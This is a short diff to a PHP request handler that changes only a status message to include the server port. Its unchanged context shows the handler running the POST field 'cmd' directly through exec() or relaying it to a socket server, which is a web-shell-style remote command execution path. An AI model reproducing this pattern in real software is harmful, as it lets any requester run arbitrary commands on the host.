@@ -50,7 +50,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             if (!$_SERVER['SOCKET']) {
               exec($_POST['cmd'], $output);
             } else {
-              $errors['server-1'] = "Connected to Server: " . APP_HOST . "\n";
+              $errors['server-1'] = "Connected to Server: " . APP_HOST . ':' . APP_PORT . "\n";
 
               // Send a message to the server
               $errors['server-2'] = 'Client request: ' . $message = "cmd: " . $_POST['cmd'] . "\n";
